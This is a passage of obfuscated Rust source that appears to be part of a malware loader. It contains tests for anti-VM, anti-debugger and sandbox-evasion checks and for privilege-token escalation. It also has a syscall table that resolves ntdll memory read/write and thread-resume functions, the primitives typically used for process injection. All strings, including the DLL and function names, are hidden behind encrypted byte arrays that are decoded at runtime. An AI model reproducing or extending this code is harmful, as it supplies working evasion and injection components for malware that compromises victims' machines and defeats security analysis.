()) ; } # [test] fn kye_ft_pgw () { if let Ok (uptime) = pc_uptime :: get_uptime_in_seconds () { println ! ("System uptime: {} seconds" , uptime) ; } } # [test] fn ldyfyua_i () { if let Ok (count) = running_processes :: get_running_processes_count () { println ! ("Running processes: {}" , count) ; } } # [test] fn alb_uyhx_r () { if let Ok (result) = bad_processes :: detect () { println ! ("Bad processes detected: {}" , result) ; } } # [test] fn csejxhyr () { println ! ("VM environment detected: {}" , run_vm_checks ()) ; } # [test] fn czkjylna () { println ! ("Suspicious environment detected: {}" , run_environment_checks ()) ; } # [test] fn u_qzrbwxg () { if let Ok (connected) = internet_check :: check_connection () { println ! ("Internet connection available: {}" , connected) ; } } # [test] fn zpoxze_ig () { if let Ok (small_screen) = monitor_metrics :: is_screen_small () { println ! ("Small screen detected: {}" , small_screen) ; } } # [test] fn jvrppdad () { println ! ("Blacklisted username: {}" , username_check :: check_for_blacklisted_names ()) ; } # [test] fn fijlssbm () { if let Ok (usb_detected) = usb_check :: plugged_in () { println ! ("USB devices detected: {}" , usb_detected) ; } } # [test] fn ukcfath_c () { println ! ("Clean environment (10+ programs): {}" , clean_environment_detection :: detect_clean_environment ()) ; } # [test] fn yutfgmg_l () { if admin_check :: is_admin () { match all_tokens :: enable () { Ok (_) => println ! ("Successfully enabled all available privileges") , Err (e) => println ! ("Failed to enable privileges: {}" , e) , } } else { println ! ("Not running as admin, cannot test privilege escalation") ; } } # [test] fn cvhrse_h_u () { let detected = ry_cshwk_r () ; println ! ("Anti-analysis measures detected: {}" , detected) ; println ! ("Debug checks: {}" , run_debug_checks ()) ; println ! ("VM checks: {}" , run_vm_checks ()) ; println ! ("Environment checks: {}" , run_environment_checks ()) ; println ! ("Process checks: {}" , run_process_checks ()) ; } # [test] fn lhqrwkwj () { if runtime_detector :: is_windows () { let detected = cevcg_ns_d () ; println ! ("Windows-specific checks detected threats: {}" , detected) ; } else { println ! ("Not running on Windows, skipping Windows-specific tests") ; } } }      type NtQueryInformationProcess = extern "system" fn (ProcessHandle : * mut c_void , ProcessInformationClass : PROCESS_INFORMATION_CLASS , ProcessInformation : * mut c_void , ProcessInformationLength : u32 , ReturnLength : * mut u32 ,) -> i32 ; type NtClose = extern "system" fn (Handle : * mut c_void) -> i32 ; type NtReadVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToRead : usize , NumberOfBytesRead : * mut usize ,) -> i32 ; type NtWriteVirtualMemory = extern "system" fn (ProcessHandle : * mut c_void , BaseAddress : * mut c_void , Buffer : * mut c_void , NumberOfBytesToWrite : usize , NumberOfBytesWritten : * mut usize ,) -> i32 ; type NtResumeThread = extern "system" fn (ThreadHandle : * mut c_void , SuspendCount : * mut u32 ,) -> i32 ; # [derive (Clone)] pub struct Syscalls { pub NtQueryInformationProcess : NtQueryInformationProcess , pub NtClose : NtClose , pub NtReadVirtualMemory : NtReadVirtualMemory , pub NtWriteVirtualMemory : NtWriteVirtualMemory , pub NtResumeThread : NtResumeThread , } impl Syscalls { fn new () -> Result < Self , & 'static str > { unsafe { let ntdll = LoadLibraryA (decode_lzheqqnx_ibng (& [77 , 89 , 8 , 26 , 97 , 133 , 61 , 155 , 121 , 174 , 158 , 42 , 1 , 144 , 194 , 185 , 214 , 81 , 9 , 76 , 115 , 79 , 77 , 222 , 75 , 122 , 24 , 112 , 45 , 221 , 181 , 112 , 133 , 66 , 211 , 97 , 179 , 61 , 59 , 202 , 139 , 240 , 230 , 23 , 237 , 93 , 129 , 242 , 119 , 21 , 79 , 209 , 248 , 192 , 166 , 130 , 34 , 48 , 230 , 247 , 240 , 251 , 153 , 57 , 153 , 95 , 23 , 163 , 107 , 134 , 98 , 48 , 131 , 14 , 62 , 147 , 217 , 24 , 205 , 51 , 79 , 194 , 139 , 165 , 40 , 21 , 127 , 38 , 12 , 38 , 63 , 38 , 48 , 119 , 106 , 131 , 162 , 151 , 202 , 134 , 31 , 101 , 149 , 240 , 159 , 16 , 48 , 74 , 218 , 95 , 246 , 37 , 69 , 200 , 110 , 34 , 99 , 128 , 69 , 216 , 13 , 204 , 230 , 33 , 201 , 21 , 150 , 111 , 179 , 210 , 72 , 56 , 181 , 180 , 125 , 15 , 157 , 154 , 247 , 248 , 216 , 87 , 7 , 47] , & [57 , 59 , 174 , 167 , 189 , 191 , 51 , 151 , 157 , 196 , 202 , 38 , 218 , 51 , 238 , 21 , 211 , 63 , 152 , 112 , 87 , 68 , 92 , 234 , 114 , 28 , 0 , 172 , 234 , 244 , 55 , 30 , 183 , 220 , 58 , 184 , 180 , 221 , 126 , 102 , 235 , 145 , 36 , 157 , 150 , 236 , 115 , 85 , 94 , 51 , 246 , 93 , 100 , 205 , 171 , 122 , 35 , 109 , 176 , 57 , 159 , 88 , 198 , 145 , 144 , 118 , 98 , 159 , 55 , 78 , 155 , 60 , 198 , 147 , 72 , 45 , 165 , 211 , 254 , 240 , 33 , 6 , 202 , 192 , 226 , 15 , 200 , 194] , 23742579213193u64) . as_ptr ()) ; if ntdll == 0 { return Err (decode_lzheqqnx_ibng (& [68 , 149 , 217 , 155 , 123 , 217 , 33 , 11 , 19 , 71 , 172 , 76 , 29 , 143 , 90 , 17 , 241 , 198 , 210 , 113 , 170 , 49 , 100 , 167 , 214 , 169 , 190 , 25 , 5 , 32 , 58 , 71 , 210 , 100 , 18 , 27 , 224 , 101 , 40 , 241 , 112 , 212 , 45 , 175 , 165 , 13 , 133 , 205 , 117 , 96 , 41 , 44 , 183 , 225 , 136 , 209 , 176 , 137 , 250 , 22 , 229 , 10 , 238 , 194 , 174 , 146 , 150 , 239 , 100 , 157 , 27 , 83 , 127 , 170 , 165 , 31 , 120 , 245 , 101 , 144 , 75 , 130 , 121 , 40 , 227 , 14 , 29 , 64 , 49 , 40 , 140 , 135 , 39 , 9 , 90 , 111 , 235 , 34 , 84 , 213 , 88 , 197 , 191 , 15 , 243 , 39 , 255 , 71 , 155 , 201 , 72 , 234 , 206 , 31 , 21 , 226 , 133 , 199 , 51 , 241 , 211 , 102 , 154 , 52 , 42 , 160 , 74 , 172 , 100 , 170 , 11 , 184 , 161 , 4 , 19 , 39 , 67 , 177 , 112 , 147 , 235 , 99 , 135 , 228 , 1 , 161 , 233 , 161 , 54 , 197 , 236 , 162 , 252 , 50 , 174 , 200 , 4 , 102 , 7 , 154 , 98 , 28 , 58 , 62 , 42 , 96 , 118 , 85 , 12 , 188 , 21 , 110 , 116 , 159 , 17 , 249 , 209 , 70 , 180 , 83 , 147 , 47 , 52 , 117 , 90 , 65 , 9 , 196 , 209 , 24 , 21 , 19 , 26 , 23 , 127 , 205 , 162 , 210 , 74 , 172 , 174 , 77 , 32 , 88 , 177 , 84 , 160 , 106 , 146 , 82 , 225 , 219 , 210 , 79 , 33 , 81 , 112 , 33 , 157 , 109 , 245 , 84 , 13 , 101 , 90 , 113 , 215 , 223 , 169 , 183 , 17 , 191 , 103 , 206 , 208 , 104 , 255 , 73 , 115 , 96 , 181 , 103 , 244 , 32 , 174 , 39 , 124 , 94 , 81 , 55 , 125 , 122 , 182 , 44 , 184 , 201 , 134 , 91 , 252 , 188 , 183 , 224 , 54 , 189 , 163 , 127 , 181 , 89 , 155 , 28 , 132 , 140 , 15 , 228 , 174 , 58 , 142 , 55 , 120 , 185 , 245 , 1 , 51 , 59 , 133 , 18 , 147 , 49] , & [235 , 145 , 41 , 48 , 105 , 152 , 58 , 71 , 223 , 178 , 108 , 86 , 70 , 65 , 112 , 57 , 174 , 145 , 134 , 129 , 220 , 175 , 197 , 8 , 129 , 60 , 165 , 173 , 27 , 225 , 84 , 56 , 221 , 193 , 15 , 231 , 255 , 164 , 28 , 98 , 46 , 136 , 215 , 232 , 59 , 3 , 184 , 31 , 168 , 219 , 83 , 70 , 94 , 190 , 224 , 66 , 214 , 168 , 221 , 249 , 241 , 212 , 29 , 154 , 191 , 110 , 71 , 101 , 163 , 158 , 214 , 161 , 235 , 60 , 84 , 108 , 102 , 0 , 92 , 106 , 197 , 101 , 9 , 169 , 199 , 167 , 246 , 168] , 117639154239665u64)) ; } let NtQueryInformationProcess = GetProcAddress (ntdll , decode_lzheqqnx_ibng (& [110 , 102 , 128 , 143 , 68 , 209 , 171 , 209 , 15 , 139 , 191 , 183 , 82 , 200 , 110 , 133 , 136 , 45 , 118 , 106 , 42 , 251 , 10 , 68 , 39 , 227 , 143 , 192 , 114 , 173 , 40 , 75 , 161 , 246 , 196 , 29 , 66 , 32 , 2 , 119 , 50 , 77 , 182 , 205 , 82 , 199 , 180 , 42 , 8 , 248 , 255 , 252 , 218 , 82 , 228 , 239 , 22 , 184 , 244 , 71 , 174 , 110 , 110 , 146 , 30 , 43 , 167 , 123 , 155 , 133 , 238 , 21 , 169 , 98 , 167 , 101 , 133 , 89 , 27 , 164 , 112 , 136 , 106 , 115 , 65 , 121 , 172 , 27 , 70 , 112 , 252 , 228 , 1 , 70 , 105 , 236 , 62 , 71 , 3 , 172 , 226 , 73 , 188 , 29 , 77 , 187 , 93 , 226 , 185 , 173 , 195 , 210 , 114 , 184 , 252 , 198 , 213 , 196 , 217 , 102 , 64 , 12 , 252 , 160 , 172 , 102 , 224 , 169 , 104 , 213 , 142 , 28 , 140 , 132 , 121 , 203 , 136 , 89 , 182 , 65 , 75 , 81 , 42 , 59 , 114 , 65 , 231 , 138 , 5 , 72 , 189 , 199 , 92 , 56 , 65 , 153 , 30 , 152 , 19 , 6 , 63 , 178 , 147 , 128 , 233 , 100 , 174 , 235 , 184 , 95 , 178 , 234 , 216 , 150 , 202 , 84 , 126 , 154 , 106 , 44 , 119 , 115 , 143 , 126 , 36 , 241 , 1 , 126 , 13 , 32 , 52 , 124 , 60 , 81 , 208 , 35 , 32 , 180 , 67 , 0 , 218 , 169 , 50 , 14 , 161 , 97 , 222 , 155 , 119 , 147 , 206 , 74 , 174 , 80 , 249 , 232 , 61 , 95 , 216 , 44 , 211 , 107 , 94 , 17 , 45 , 192 , 10 , 46 , 186 , 10 , 252 , 86 , 32 , 218 , 141 , 111 , 186 , 32 , 146 , 249 , 67 , 105 , 64 , 133 , 55 , 30 , 56 , 117 , 248 , 7 , 139 , 11 , 99 , 247 , 224 , 117 , 197 , 213 , 139 , 227 , 241 , 175 , 71 , 191 , 156 , 110 , 17 , 244 , 209 , 69 , 42 , 193 , 29 , 122 , 81 , 84 , 32 , 159 , 98 , 170 , 200 , 148 , 184 , 117 , 222 , 123 , 117 , 99 , 170 , 138 , 55 , 187 , 81 , 99 , 130 , 129 , 198 , 10 , 135 , 112 , 88 , 49 , 242 , 68 , 157 , 23 , 185 , 151 , 169 , 30 , 107 , 108 , 178 , 225 , 171 , 177 , 106 , 134 , 31 , 105] , & [74 , 30 , 168 , 44 , 225 , 202 , 90 , 211 , 209 , 62 , 232 , 120 , 40 , 45 , 48 , 123 , 228 , 76 , 165 , 67 , 229 , 142 , 173 , 145 , 37 , 108 , 90 , 83 , 195 , 38 , 32 , 235 , 33 , 51 , 143 , 201 , 186 , 68 , 158 , 171 , 107 , 171 , 52 , 73 , 135 , 173 , 113 , 175 , 140 , 182 , 96 , 178 , 18 , 200 , 225 , 67 , 215 , 15 , 208 , 121 , 123 , 209 , 68 , 116 , 159 , 78 , 19 , 79 , 132 , 52 , 21 , 102 , 127 , 229 , 63 , 170 , 62 , 135 , 1 , 145 , 52 , 11 , 207 , 158 , 245 , 12 , 27 , 140] , 155580895332926u64) . as_ptr ()) ; let NtClose = GetProcAddress (ntdll , decode_lzheqqnx_ibng (& [245 , 11 , 247 , 121 , 203 , 30 , 82 , 206 , 177 , 220 , 19 , 200 , 58 , 60 , 77 , 56 , 64 , 3 , 115 , 255 , 25 , 128 , 66 , 150 , 178 , 206 , 193 , 205 , 219 , 242 , 217 , 27 , 235 , 218 , 46 , 32 , 109 , 117 , 1 , 67 , 210 , 170 , 231 , 128 , 193 , 66 , 15 , 102 , 168 , 182 , 235 , 92 , 20 , 19 , 232 , 75 , 111 , 97 , 79 , 37 , 79 , 159 , 70 , 140 , 214 , 37 , 41 , 115 , 214 , 155 , 234 , 32 , 39 , 37 , 34 , 136 , 124 , 168 , 231 , 225 , 100 , 233 , 63 , 214 , 190 , 205 , 74 , 138 , 141 , 26 , 10 , 96 , 88 , 202 , 97 , 27 , 70 , 246 , 57 , 237 , 18 , 69 , 27 , 166 , 140 , 29 , 243 , 55 , 185 , 41 , 119 , 155 , 201 , 21 , 113 , 166 , 103 , 157 , 251 , 56 , 46 , 251 , 38 , 74 , 162 , 112 , 20 , 187] , & [48 , 188 , 140 , 43 , 120 , 162 , 140 , 218 , 45 , 126 , 45 , 241 , 110 , 151 , 221 , 237 , 227 , 49 , 43 , 158 , 125 , 202 , 167 , 86 , 88 , 161 , 126 , 55 , 63 , 211 , 179 , 53 , 162 , 153 , 251 , 219 , 222 , 37 , 35 , 65 , 29 , 31 , 3 , 17 , 22 , 87 , 249 , 216 , 161 , 144 , 150 , 40 , 238 , 162 , 5 , 192 , 212 , 53 , 129 , 198 , 65 , 160 , 119 , 52 , 26 , 167 , 105 , 215 , 164 , 217 , 103 , 246 , 125 , 48 , 187 , 159 , 199 , 238 , 253 , 79 , 250 , 212 , 239 , 23 , 193 , 40 , 224 , 153] , 14504104559289u64) . as_ptr ()) ; let NtReadVirtualMemory = GetProcAddress (ntdll , decode_lzheqqnx_ibng (& [169 , 158 , 224 , 116 , 212 , 59 , 220 , 218 , 184 , 128 , 120 , 190 , 214 , 57 , 83 , 21 , 107 , 162 , 199 , 226 , 122 , 116 , 160 , 51 , 173 , 231 , 8 , 96 , 74 , 52 , 142 , 142 , 117 , 68 , 183 , 171 , 18 , 159 , 2 , 119 , 145 , 141 , 192 , 91 , 114 , 176 , 47 , 23 , 147 , 189 , 59 , 13 , 37 , 175 , 243 , 111 , 47 , 250 , 210 , 239 , 244 , 208 , 124 , 249 , 201 , 249 , 233 , 34 , 18 , 121 , 134 , 93 , 20 , 194 , 38 , 24 , 236 , 81 , 26 , 106 , 177 , 197 , 76 , 217 , 95 , 252 , 232 , 251 , 28 , 54 , 98 , 18 , 211 , 31 , 228 , 204 , 112 , 33 , 36 , 185 , 174 , 95 , 5 , 234 , 198 , 9 , 31 , 202 , 120 , 1 , 173 , 133 , 173 , 203 , 212 , 105 , 52 , 53 , 52 , 88 , 90 , 8 , 45 , 227 , 200 , 87 , 127 , 1 , 164 , 207 , 26 , 66 , 90 , 182 , 141 , 101 , 179 , 202 , 23 , 181 , 177 , 67 , 106 , 20 , 168 , 136 , 45 , 127 , 210 , 124 , 59 , 203 , 108 , 244 , 107 , 226 , 226 , 139 , 145 , 42 , 238 , 224 , 115 , 74 , 162 , 141 , 39 , 68 , 26 , 234 , 3 , 29 , 91 , 5 , 133 , 76 , 35 , 67 , 169 , 129 , 169 , 210 , 137 , 187 , 229 , 11 , 230 , 210 , 203 , 128 , 20 , 155 , 112 , 133 , 232 , 252 , 239 , 56 , 0 , 189 , 162 , 130 , 122 , 117 , 24 , 196 , 84 , 183 , 152 , 109 , 184 , 211 , 123 , 51 , 234 , 76 , 36 , 231 , 86 , 107 , 30 , 108 , 121 , 114 , 122 , 195 , 98 , 208 , 205 , 239 , 237 , 140 , 52 , 246 , 202 , 142 , 50 , 138 , 35 , 100 , 111 , 243 , 116 , 26 , 59 , 94 , 254 , 25 , 179 , 123 , 151 , 0 , 213 , 157 , 204 , 214] , & [177 , 106 , 151 , 184 , 144 , 158 , 213 , 118 , 203 , 43 , 96 , 88 , 115 , 122 , 190 , 46 , 139 , 243 , 229 , 112 , 136 , 233 , 46 , 4 , 165 , 168 , 157 , 42 , 12 , 239 , 223 , 143 , 99 , 123 , 129 , 76 , 54 , 144 , 98 , 202 , 255 , 50 , 130 , 79 , 145 , 111 , 20 , 168 , 48 , 75 , 196 , 249 , 134 , 243 , 147 , 159 , 242 , 37 , 85 , 164 , 167 , 119 , 83 , 222 , 225 , 18 , 191 , 33 , 59 , 20 , 122 , 86 , 34 , 78 , 16 , 14 , 209 , 233 , 234 , 12 , 211 , 192 , 117 , 201 , 14 , 94 , 81 , 33] , 89623082567583u64) . as_ptr ()) ; let NtWriteVirtualMemory = GetProcAddress (ntdll , decode_lzheqqnx_ibng (& [101 , 3 , 179 , 240 , 146 , 131 , 48 , 111 , 215 , 76 , 89 , 44 , 56 , 192 , 111 , 156 , 225 , 206 , 47 , 166 , 2 , 80 , 3 , 202 , 203 , 8 , 37 , 28 , 24 , 193 , 59 , 79 , 107 , 160 , 36 , 13 , 70 , 66 , 8 , 82 , 91 , 95 , 105 , 1 , 149 , 127 , 239 , 127 , 205 , 148 , 12 , 89 , 42 , 27 , 88 , 95 , 39 , 20 , 195 , 218 , 159 , 192 , 225 , 159 , 192 , 177 , 211 , 94 , 12 , 140 , 178 , 181 , 153 , 142 , 251 , 56 , 147 , 213 , 139 , 47 , 232 , 118 , 139 , 31 , 128 , 29 , 187 , 198 , 181 , 41 , 189 , 22 , 198 , 181 , 84 , 4 , 155 , 107 , 196 , 22 , 208 , 28 , 168 , 64 , 213 , 85 , 194 , 37 , 100 , 214 , 32 , 182 , 213 , 192 , 9 , 128 , 253 , 29 , 69 , 35 , 248 , 172 , 199 , 87 , 111 , 51 , 157 , 247 , 156 , 16 , 134 , 6 , 122 , 144 , 47 , 60 , 150 , 91 , 8 , 161 , 248 , 53 , 204 , 79 , 46 , 67 , 79 , 245 , 193 , 144 , 228 , 190 , 73 , 240 , 116 , 15 , 2 , 204 , 161 , 231 , 63 , 12 , 14 , 128 , 102 , 179 , 135 , 206 , 114 , 246 , 99 , 252 , 80 , 103 , 117 , 187 , 131 , 59 , 161 , 33 , 113 , 243 , 142 , 24 , 159 , 219 , 52 , 62 , 241 , 202 , 243 , 119 , 58 , 200 , 243 , 198 , 237 , 100 , 81 , 118 , 227 , 167 , 253 , 53 , 12 , 173 , 227 , 238 , 101 , 179 , 224 , 114 , 221 , 117 , 115 , 204 , 175 , 230 , 118 , 221 , 60 , 134 , 75 , 168 , 112 , 40 , 154 , 151 , 6 , 195 , 173 , 190 , 150 , 195 , 105 , 145 , 224 , 129 , 202 , 28 , 29 , 118 , 160 , 97 , 60 , 201 , 229 , 75 , 33 , 176 , 125 , 185 , 149 , 201 , 177 , 73] , & [46 , 128 , 195 , 75 , 194 , 103 , 76 , 28 , 45 , 78 , 208 , 113 , 167 , 219 , 25 , 248 , 59 , 38 , 26 , 234 , 208 , 145 , 242 , 165 , 163 , 241 , 46 , 238 , 83 , 45 , 98 , 233 , 67 , 10 , 239 , 115 , 36 , 6 , 95 , 94 , 101 , 152 , 33 , 24 , 122 , 140 , 171 , 17 , 20 , 252 , 227 , 43 , 213 , 26 , 130 , 206 , 210 , 5 , 177 , 107 , 72 , 196 , 131 , 82 , 27 , 23 , 116 , 176 , 239 , 153 , 166 , 71 , 206 , 243 , 136 , 141 , 18 , 206 , 120 , 216 , 66 , 195 , 152 , 255 , 206 , 91 , 119 , 7] , 101696235636782u64) . as_ptr ()) ; let NtResumeThread = GetProcAddress (ntdll , decode_lzheqqnx_ibng (& [240 , 161 , 239 , 63 , 222 , 41 , 94 , 171 , 44 , 188 , 95 , 178 , 17 , 245 , 114 , 189 , 216 , 21 , 154 , 112 , 102 , 58 , 182 , 50 , 85 , 28 , 39 , 223 , 173 , 38 , 153 , 170 , 28 , 128 , 122 , 226 , 125 , 148 , 246 , 178 , 93 , 252 , 233 , 201 , 112 , 224 , 250 , 38 , 142 , 160 , 75 , 198 , 65 , 138 , 164 , 224 , 18 , 11 , 89 , 241 , 202 , 106 , 69 , 209 , 152 , 201 , 233 , 190 , 197 , 101 , 56 , 50 , 33 , 64 , 227 , 62 , 232 , 110 , 23 , 251 , 50 , 237 , 209 , 165 , 249 , 231 , 64 , 118 , 93 , 21 , 155 , 125 , 17 , 0 , 145 , 244 , 236 , 246 , 104 , 4 , 83 , 219 , 9 , 207 , 30 , 151 , 206 , 184 , 111 , 142 , 156 , 194 , 63 , 238 , 95 , 111 , 206 , 160 , 102 , 16 , 47 , 129 , 231 , 211 , 178 , 253 , 132 , 54 , 42 , 162 , 76 , 235 , 13 , 168 , 224 , 199 , 76 , 233 , 185 , 44 , 208 , 216 , 201 , 225 , 20 , 109 , 24 , 224 , 198 , 121 , 55 , 4 , 11 , 90 , 113 , 193 , 31 , 100 , 190 , 224 , 143 , 203 , 159 , 137 , 65 , 182 , 194 , 26 , 28 , 135 , 8 , 67 , 5 , 62 , 185 , 140 , 134 , 107 , 44 , 32 , 189 , 138 , 218 , 63 , 232 , 55 , 249 , 126 , 123 , 165 , 103 , 95] , & [26 , 131 , 68 , 41 , 100 , 156 , 47 , 19 , 109 , 68 , 160 , 118 , 227 , 151 , 60 , 134 , 188 , 252 , 82 , 63 , 213 , 98 , 99 , 212 , 124 , 181 , 246 , 156 , 179 , 53 , 206 , 15 , 36 , 22 , 45 , 97 , 97 , 31 , 45 , 222 , 230 , 50 , 89 , 151 , 90 , 71 , 42 , 175 , 175 , 224 , 206 , 84 , 234 , 35 , 242 , 222 , 90 , 231 , 204 , 180 , 121 , 103 , 190 , 36 , 161 , 249 , 69 , 210 , 58 , 48 , 7 , 25 , 88 , 6 , 249 , 210 , 65 , 51 , 20 , 215 , 12 , 189 , 55 , 117 , 234 , 136 , 249 , 66] , 51488067945868u64) . as_ptr ()) ; if NtQueryInformationProcess . is_none () || NtClose . is_none () || NtReadVirtualMemory . is_none () || NtWriteVirtualMemory . is_none () || NtResumeThread . is_none () { return Err (decode_lzheqqnx_ibng (& [221 , 194 , 63 , 38 , 97 , 100 , 38 , 206 , 133 , 249 , 246 , 155 , 115 , 242 , 203 , 243 , 99 , 141 , 106 , 121 , 48 , 125 , 147 , 96 , 69 , 117 , 21 , 166 , 23 , 172 , 203 , 212 , 115 , 121 , 84 , 175 , 133 , 217 , 206 , 20 , 29 , 165 , 184 , 217 , 219 , 235 , 49 , 78 , 247 , 193 , 79 , 242 , 93 , 155 , 115 , 187 , 11 , 4 , 255 , 154 , 56 , 44 , 13 , 7 , 50 , 155 , 157 , 117 , 97 , 209 , 82 , 85 , 40 , 136 , 125 , 174 , 202 , 199 , 184 , 82 , 203 , 23 , 138 , 195 , 148 , 104 , 82 , 237 , 103 , 66 , 212 , 29 , 62 , 200 , 52 , 214 , 189 , 149 , 149 , 252 , 9 , 49 , 13 , 247 , 136 , 34 , 214 , 134 , 142 , 99 , 22 , 48 , 24 , 81 , 37 , 3 , 117 , 209 , 159 , 75 , 52 , 124 , 178 , 48 , 21 , 227 , 158 , 122 , 135 , 154 , 152 , 80 , 144 , 119 , 178 , 14 , 167 , 148 , 125 , 236 , 219 , 84 , 76 , 211 , 51 , 203 , 253 , 249 , 248 , 52 , 157 , 217 , 120 , 10 , 248 , 117 , 56 , 111 , 111 , 192 , 149 , 186 , 22 , 150 , 170 , 55 , 143 , 19 , 101 , 50 , 123 , 16 , 160 , 170 , 108 , 175 , 122 , 49 , 250 , 193 , 46 , 212 , 80 , 89 , 130 , 4 , 41 , 105 , 88 , 155 , 122 , 131 , 112 , 19 , 109 , 246 , 153 , 203 , 17 , 123 , 131 , 22 , 205 , 73 , 184 , 96 , 57 , 68 , 251 , 253 , 135 , 228 , 231 , 189 , 81 , 149 , 201 , 97 , 109 , 38 , 193 , 169 , 29 , 199 , 27 , 27 , 218 , 29 , 255 , 19 , 253 , 51 , 174 , 30 , 62 , 176 , 245 , 21 , 85 , 216 , 49 , 146 , 48 , 131 , 16 , 10 , 129 , 30 , 239 , 4 , 140 , 68 , 201 , 226 , 137 , 151 , 12 , 218 , 139 , 33 , 45 , 216 , 51 , 11 , 209 , 188 , 66 , 101 , 52 , 205 , 115 , 151 , 118 , 203 , 198 , 137 , 245 , 163 , 187 , 197 , 12 , 213 , 229 , 228 , 25 , 27 , 188 , 151 , 96 , 143 , 238 , 37 , 234 , 131 , 140 , 148 , 63 , 30 , 94 , 74 , 220 , 63 , 17 , 83 , 116 , 127 , 52 , 180 , 25 , 152 , 96 , 29 , 94 , 124 , 1 , 10 , 249 , 212 , 76 , 79 , 2 , 146 , 204 , 147 , 91 , 115 , 246 , 36 , 37 , 168 , 179 , 248 , 31 , 136 , 194 , 78 , 135 , 20 , 128 , 136 , 211 , 106 , 241 , 138 , 218 , 216 , 43 , 116 , 211 , 23 , 250 , 79 , 156 , 221 , 229 , 40 , 5 , 39 , 4 , 242 , 58 , 144 , 240 , 18 , 202 , 90 , 175 , 99 , 172 , 191 , 188 , 215 , 51 , 69 , 78 , 107 , 207 , 68 , 1 , 230 , 70 , 29 , 33 , 187 , 105 , 145 , 243 , 67 , 11 , 197 , 107 , 188 , 237 , 191 , 45 , 70 , 233 , 51 , 111 , 4 , 131 , 233 , 41 , 244 , 180 , 182 , 129 , 25 , 143 , 109 , 111 , 9 , 71 , 155 , 213 , 90 , 231 , 99 , 90 , 2 , 135 , 8 , 119 , 59 , 123 , 223 , 197 , 162 , 197 , 188 , 234 , 217 , 255 , 50 , 123 , 18 , 181 , 201 , 167 , 159 , 194 , 49 , 28 , 80 , 45 , 228 , 41 , 92 , 252 , 113 , 68 , 21 , 157 , 51 , 237 , 55 , 59 , 93 , 68 , 78 , 82 , 21 , 233 , 195 , 37 , 253 , 239 , 34 , 139 , 54 , 126 , 51 , 180 , 139 , 186 , 195 , 224 , 248 , 75 , 129 , 180 , 128 , 130 , 215 , 152 , 251 , 113 , 23 , 55 , 68 , 46 , 97 , 251 , 140 , 168 , 49 , 195 , 94 , 1 , 233 , 245 , 203 , 12 , 93 , 11 , 196 , 105 , 241 , 69 , 109 , 233 , 63] , & [133 , 113 , 14 , 249 , 38 , 34 , 130 , 154 , 35 , 249 , 133 , 162 , 45 , 153 , 103 , 122 , 105 , 22 , 62 , 24 , 244 , 87 , 47 , 184 , 118 , 62 , 159 , 38 , 32 , 169 , 247 , 50 , 17 , 218 , 246 , 114 , 52 , 5 , 64 , 63 , 123 , 242 , 255 , 202 , 99 , 76 , 16 , 109 , 169 , 152 , 131 , 115 , 129 , 151 , 181 , 203 , 127 , 3 , 169 , 117 , 240 , 23 , 108 , 134 , 39 , 239 , 215 , 109 , 49 , 241 , 141 , 32 , 225 , 225 , 242 , 62 , 217 , 198 , 209 , 151 , 7 , 199 , 123 , 168 , 214 , 75 , 161 , 237] , 107404247175235u64)) ; } Ok (Syscalls { NtQueryInformationProcess : transmute (NtQueryInformationProcess . unwrap ()) , NtClose : transmute (NtClose . unwrap ()) , NtReadVirtualMemory : transmute (NtReadVirtualMemory . unwrap ()) , NtWriteVirtualMemory : transmute (NtWriteVirtualMemory . unwrap ()) , NtResumeThread : transmute (NtResumeThread . unwrap ()) , }) } } } pub static efun_ms_tn : Lazy < Syscalls > = Lazy :: new (| | { Syscalls :: new () . expect ("") }) ;
fn main() { gryczszf(); }